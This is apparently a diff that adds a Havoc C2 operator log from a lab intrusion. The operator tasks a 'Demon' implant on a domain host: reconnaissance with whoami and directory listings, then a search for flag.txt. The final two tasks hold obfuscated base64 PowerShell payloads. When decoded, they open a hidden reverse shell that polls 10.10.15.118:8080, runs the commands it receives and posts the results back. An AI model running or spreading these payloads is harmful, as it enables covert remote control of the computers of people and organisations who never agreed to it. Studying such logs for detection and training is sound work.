@@ -1,0 +1,137 @@
+
+[Time: 10/04/2023 02:09:45] [User: 5pider] [TaskID: E079D6F1] Demon => 
+
+[Time: 10/04/2023 02:09:45] [User: 5pider] [TaskID: E079D6F1] Demon => whoami
+[10/04/2023 02:09:47] [+] Send Task to Agent [6903 bytes]
+[10/04/2023 02:09:47] [+] Received Output [3142 bytes]:
+
+UserName		SID
+====================== ====================================
+RLAB\tquinn	S-1-5-21-1396373213-2872852198-2033860859-2102
+
+
+GROUP INFORMATION                                 Type                     SID                                          Attributes               
+================================================= ===================== ============================================= ==================================================
+RLAB\Domain Users                                 Group                    S-1-5-21-1396373213-2872852198-2033860859-513 Mandatory group, Enabled by default, Enabled group, 
+Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group, 
+BUILTIN\Users                                     Alias                    S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\INTERACTIVE                          Well-known group         S-1-5-4                                       Mandatory group, Enabled by default, Enabled group, 
+CONSOLE LOGON                                     Well-known group         S-1-2-1                                       Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\This Organization                    Well-known group         S-1-5-15                                      Mandatory group, Enabled by default, Enabled group, 
+LOCAL                                             Well-known group         S-1-2-0                                       Mandatory group, Enabled by default, Enabled group, 
+RLAB\Human Resources                              Group                    S-1-5-21-1396373213-2872852198-2033860859-1165 Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\NTLM Authentication                  Well-known group         S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group, 
+Mandatory Label\Medium Mandatory Level            Label                    S-1-16-8192                                   Mandatory group, Enabled by default, Enabled group, 
+
+
+Privilege Name                Description                                       State                         
+============================= ================================================= ===========================
+SeShutdownPrivilege           Shut down the system                              Disabled                      
+SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled                       
+SeUndockPrivilege             Remove computer from docking station              Disabled                      
+SeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled                      
+SeTimeZonePrivilege           Change the time zone                              Disabled                      
+
+[Time: 10/04/2023 02:27:08] [User: 5pider] [TaskID: 692DB507] Demon => powershell c:\users\
+[10/04/2023 02:27:08] [+] Send Task to Agent [102 bytes]
+[10/04/2023 02:27:11] [+] Received Output [427 bytes]:
+c:\users\ : The term 'c:\users\' is not recognized as the name of a cmdlet, function, script file, or operable 
+program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ c:\users\
++ ~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (c:\users\:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+ 
+
+[Time: 10/04/2023 02:27:22] [User: 5pider] [TaskID: FCB1304A] Demon => powershell ls c:\users\
+[10/04/2023 02:27:23] [+] Send Task to Agent [105 bytes]
+[10/04/2023 02:27:25] [+] Received Output [1005 bytes]:
+
+
+    Directory: C:\users
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----        10/08/2022     18:31                Administrator                                                        
+d-----        30/08/2021     12:12                Administrator.WS06                                                   
+d-----        30/08/2021     12:13                Build                                                                
+d-r---        30/08/2021     21:06                Public                                                               
+d-----        30/08/2021     12:12                rweston_da                                                           
+d-----        30/08/2021     12:28                tquinn                                                               
+
+
+
+[Time: 10/04/2023 02:27:43] [User: 5pider] [TaskID: C706A9B2] Demon => powershell ls c:\users\tquinn
+[10/04/2023 02:27:43] [+] Send Task to Agent [111 bytes]
+[10/04/2023 02:27:45] [+] Received Output [1496 bytes]:
+
+
+    Directory: C:\users\tquinn
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-r---        30/08/2021     12:28                3D Objects                                                           
+d-r---        30/08/2021     12:28                Contacts                                                             
+d-r---        30/08/2021     12:28                Favorites                                                            
+d-r---        30/08/2021     12:28                Links                                                                
+d-r---        30/08/2021     12:28                Music                                                                
+d-r---        22/03/2020     14:53                OneDrive                                                             
+d-r---        30/08/2021     12:28                Pictures                                                             
+d-r---        30/08/2021     12:28                Saved Games                                                          
+d-r---        30/08/2021     12:28                Searches                                                             
+d-r---        30/08/2021     12:28                Videos                                                               
+
+
+
+[Time: 10/04/2023 02:28:38] [User: 5pider] [TaskID: E469A8C1] Demon => powershell Get-ChildItem -Path C:\ -Filter flag.txt -Recurse -ErrorAction SilentlyContinue -Force
+[10/04/2023 02:28:40] [+] Send Task to Agent [179 bytes]
+[10/04/2023 02:29:33] [+] Received Output [0 bytes]:
+
+[Time: 10/04/2023 02:30:16] [User: 5pider] [TaskID: 5F9C4B18] Demon => 
+
+[Time: 10/04/2023 02:30:16] [User: 5pider] [TaskID: 5F9C4B18] Demon => whoami
+[10/04/2023 02:30:17] [+] Send Task to Agent [6903 bytes]
+[10/04/2023 02:30:17] [+] Received Output [3142 bytes]:
+
+UserName		SID
+====================== ====================================
+RLAB\tquinn	S-1-5-21-1396373213-2872852198-2033860859-2102
+
+
+GROUP INFORMATION                                 Type                     SID                                          Attributes               
+================================================= ===================== ============================================= ==================================================
+RLAB\Domain Users                                 Group                    S-1-5-21-1396373213-2872852198-2033860859-513 Mandatory group, Enabled by default, Enabled group, 
+Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group, 
+BUILTIN\Users                                     Alias                    S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\INTERACTIVE                          Well-known group         S-1-5-4                                       Mandatory group, Enabled by default, Enabled group, 
+CONSOLE LOGON                                     Well-known group         S-1-2-1                                       Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\This Organization                    Well-known group         S-1-5-15                                      Mandatory group, Enabled by default, Enabled group, 
+LOCAL                                             Well-known group         S-1-2-0                                       Mandatory group, Enabled by default, Enabled group, 
+RLAB\Human Resources                              Group                    S-1-5-21-1396373213-2872852198-2033860859-1165 Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\NTLM Authentication                  Well-known group         S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group, 
+Mandatory Label\Medium Mandatory Level            Label                    S-1-16-8192                                   Mandatory group, Enabled by default, Enabled group, 
+
+
+Privilege Name                Description                                       State                         
+============================= ================================================= ===========================
+SeShutdownPrivilege           Shut down the system                              Disabled                      
+SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled                       
+SeUndockPrivilege             Remove computer from docking station              Disabled                      
+SeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled                      
+SeTimeZonePrivilege           Change the time zone                              Disabled                      
+
+[Time: 10/04/2023 02:30:24] [User: 5pider] [TaskID: 0586DF24] Demon => powershell powershell -e cwB0AEEAUgB0AC0AcAByACcAbwBDAEUAJwBTAHMAIAAkAFAAUwBIAE8ATQBFAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBhAFIARwBVAE0AZQBuAHQAbABJAFMAVAAgAHsAJAAwADAANQA4ADYAYgA9ACQAKAAnADEAMAAuADEAMAAuADEANQAuACcAKwAnADEAJwArACcAMQA4ADoAOAAwADgAMAAnACkAOwAkADQAOAA5AD0AJAAoACcANwAyADcANQAxADUAJwAgAC0AcgBlAFAATABhAGMARQAgACcAWwBcAGQAXABkAFwAZABdAHsAMwB9AFsANQBdAHsAMQB9AFsAMQA1AF0AewAyAH0AJwAsACcAMQAwADEANgBmADAAZQAxAC0AMQAyAGYAOQBhADQANgA1AC0AOAA2ADMANwA3AGYAMgAyACcAKQA7ACQAYQA3AGYANQBmAD0AJwBoAHQAdABwACcAKwAnADoAJwArACcALwAvACcAOwAkAGIAMgA9AEkAbgBWAE8ASwBlAC0AUgBFAHMAVAAnAE0ARQBUACcAaABvAGQAIAAtAFUAcwBlAGIAYQBTAEkAYwBQAEEAUgBTAGkATgBHACAALQB1AFIASQAgACQAYQA3AGYANQBmACQAMAAwADUAOAA2AGIALwAxADAAMQA2AGYAMABlADEALwAkAGUAbgB2ADoAQwBvAE0AcAB1AFQARQBSAG4AQQBNAEUALwAkAGUAbgB2ADoAVQBzAEUAcgBuAGEATQBlACAALQBoAGUAYQBEAGUAUgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJAA0ADgAOQB9ADsAZgBvAHIAIAAoADsAOwApAHsAJAAyADYAZAAyADMAPQAoAEkAbgBWAE8ASwBlAC0AUgBFAHMAVAAnAE0ARQBUACcAaABvAGQAIAAtAFUAcwBlAGIAYQBTAEkAYwBQAEEAUgBTAGkATgBHACAALQB1AFIASQAgACQAYQA3AGYANQBmACQAMAAwADUAOAA2AGIALwAxADIAZgA5AGEANAA2ADUAIAAtAGgAZQBhAEQAZQBSAHMAIABAAHsAIgBBAHUAdABoAG8AcgBpAHoAYQB0AGkAbwBuACIAPQAkADQAOAA5AH0AKQA7AGkAZgAgACgAJAAyADYAZAAyADMAIAAtAG4AZQAgACgAJwBOAG8AJwArACcAbgBlACcAKQApACAAewAkAGMAPQBJAG4AJwBWAE8AawBFAC0ARQBYAHAAcgBFAFMAcwBJAG8AbgAnACAAJAAyADYAZAAyADMAIAAtAEUAcgByAE8AUgBhAEMAdABJAE8ATgAgAFMAJwBUAE8AJwBQACAALQBlAFIAcgBPAFIAdgBhAFIAaQBBAEIAbABFACAANgA7ACQAYwA9AG8AVQBUAC0AJwBTAFQAUgBJACcAbgBHACAALQBpAE4AUABVAHQAbwBiAEoARQBjAFQAIAAkAGMAOwAkAGIAMwAxAGUAPQBJAG4AVgBPAEsAZQAtAFIARQBzAFQAJwBNAEUAVAAnAGgAbwBkACAALQB1AFIASQAgACQAYQA3AGYANQBmACQAMAAwADUAOAA2AGIALwA4ADYAMwA3ADcAZgAyADIAIAAtAE0ARQB0AEgAbwBEACAAUABPAFMAVAAgAC0AaABlAGEARABlAFIAcwAgAEAAewAiAEEAdQB0AGgAbwByAGkAegBhAHQAaQBvAG4AIgA9ACQANAA4ADkAfQAgAC0AYgBvAEQAeQAgACgAWwBTAHkAcwB0AEUATQAuAHQARQB4AHQALgBlAE4AYwBvAGQAaQBuAEcAXQA6ADoAdQBUAEYAOAAuAEcAZQB0AEIAeQBUAEUAUwAoACQANgArACQAYwApACAALQBqAE8ASQBuACAAJwAgACcAKQB9ACAAcwAnAEwAZQBlAHAAJwAgADAALgA4AH0AfQAgAC0AdwBJAE4AZABPAHcAUwB0AFkAbABFACAASABpAEQAJwBkAEUAJwBuAA==
+[10/04/2023 02:30:26] [+] Send Task to Agent [2171 bytes]
+[10/04/2023 02:30:30] [+] Received Output [1021 bytes]:
+#< CLIXML
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Searching for available modules</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Searching UNC share \\fs01.rastalabs.local\home$\tquinn\Documents\WindowsPowerShell\Modules.</SD></PR></MS></Obj><Obj S="progress" RefId="1"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Searching for available modules</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD>Searching UNC share \\fs01.rastalabs.local\home$\tquinn\Documents\WindowsPowerShell\Modules.</SD></PR></MS></Obj><Obj S="progress" RefId="2"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>
+[Time: 10/04/2023 02:30:44] [User: 5pider] [TaskID: D76392E8] Demon => powershell powershell -e cwBUAEEAJwBSAFQALQBwAFIAbwBDAGUAcwBzACcAIAAkAFAAUwBIAE8ATQBFAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBBAHIAZwBVAG0ARQBuAFQATABpAFMAdAAgAHsAJAA2AD0AJAAoACcAMABiADIAMQBjADgAJwAgAC0AcgBlAFAAbABhAEMAZQAgACcAWwAoADAAfABcAD8AKQBdAHsAMQB9AFsAKABiAHwAXAA/ACkAXQB7ADEAfQBbADIAXABkAGMAXQB7ADMAfQBbADgAXQB7ADEAfQAnACwAJwAxADAALgAxADAALgAxADUALgAxADEAOAA6ADgAMAA4ADAAJwApADsAJAA5ADAAMwA9ACcAZQA2ADMAJwArACcAYwAyAGIAMgAyAC0AMQAzAGYANgA3ADgAYgA0AC0ANABjAGIAYwA1ACcAKwAnADYAJwArACcAMgAnACsAJwA4ACcAOwAkAGEANQA4ADMAPQAkACgAJwBlADAAMgA1AGQAZQAnACAALQByAEUAUABMAGEAYwBFACAAJwBbAGUAXQB7ADEAfQBbACgAMAB8AFwAPwApADIAKAA1AHwAXAA/ACkAKABkAHwAXAA/ACkAXAB3AF0AewA1AH0AJwAsACcAaAB0AHQAcAA6AC8ALwAnACkAOwAkADQANwAyAGIAPQBJAG4AdgAnAE8ASwBFAC0AUgBFAHMAVABtAGUAdABIAG8AJwBEACAALQBVAFMAZQBCAEEAcwBJAGMAUABhAFIAUwBpAE4AZwAgAC0AdQByAEkAIAAkAGEANQA4ADMAJAA2AC8AZQA2ADMAYwAyAGIAMgAyAC8AJABlAG4AdgA6AEMATwBtAHAAdQB0AEUAUgBuAGEATQBFAC8AJABlAG4AdgA6AHUAcwBlAFIAbgBhAG0ARQAgAC0ASABFAEEAZABFAFIAUwAgAEAAewAiAEEAdQB0AGgAbwByAGkAegBhAHQAaQBvAG4AIgA9ACQAOQAwADMAfQA7AGYAbwByACAAKAA7ADsAKQB7ACQANgBkAD0AKABJAG4AdgAnAE8ASwBFAC0AUgBFAHMAVABtAGUAdABIAG8AJwBEACAALQBVAFMAZQBCAEEAcwBJAGMAUABhAFIAUwBpAE4AZwAgAC0AdQByAEkAIAAkAGEANQA4ADMAJAA2AC8AMQAzAGYANgA3ADgAYgA0ACAALQBIAEUAQQBkAEUAUgBTACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJAA5ADAAMwB9ACkAOwBpAGYAIAAoACQANgBkACAALQBOAGUAIAAoACcATgBvAG4AZQAnACkAKQAgAHsAJABjADcAOAA9AEkAJwBOAFYATwBrAGUALQBlAFgAcAAnAFIAZQBzAHMAaQBvAG4AIAAkADYAZAAgAC0ARQBSAHIATwByAGEAYwBUAGkAbwBOACAAcwAnAHQATwBQACcAIAAtAGUAcgByAE8AcgB2AGEAUgBpAGEAYgBsAGUAIAA1ADQAOQAxADsAJABjADcAOAA9AE8AJwBVAHQALQBzAFQAcgBJAE4AZwAnACAALQBpAG4AcAB1AFQATwBCAEoARQBjAFQAIAAkAGMANwA4ADsAJAAwADIAMgAwADQAMAA9AEkAbgB2ACcATwBLAEUALQBSAEUAcwBUAG0AZQB0AEgAbwAnAEQAIAAtAHUAcgBJACAAJABhADUAOAAzACQANgAvADQAYwBiAGMANQA2ADIAOAAgAC0AbQBFAHQAaABvAGQAIABQAE8AUwBUACAALQBIAEUAQQBkAEUAUgBTACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJAA5ADAAMwB9ACAALQBCAG8ARABZACAAKABbAFMAeQBzAFQARQBNAC4AVABFAFgAdAAuAGUAbgBjAE8AZABpAE4ARwBdADoAOgB1AHQARgA4AC4AZwBFAHQAYgBZAFQARQBTACgAJAA1ADQAOQAxACsAJABjADcAOAApACAALQBqAE8ASQBOACAAJwAgACcAKQB9ACAAcwBMAGUAJwBlAHAAJwAgADAALgA4AH0AfQAgAC0AdwBJAE4ARABPAFcAcwBUAFkAbABlACAAaAAnAEkAZABkAGUAbgAnAA==
+[10/04/2023 02:30:46] [+] Send Task to Agent [2299 bytes]
+[10/04/2023 02:30:50] [+] Received Output [1021 bytes]:
+#< CLIXML
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Searching for available modules</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Searching UNC share \\fs01.rastalabs.local\home$\tquinn\Documents\WindowsPowerShell\Modules.</SD></PR></MS></Obj><Obj S="progress" RefId="1"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Searching for available modules</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD>Searching UNC share \\fs01.rastalabs.local\home$\tquinn\Documents\WindowsPowerShell\Modules.</SD></PR></MS></Obj><Obj S="progress" RefId="2"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>
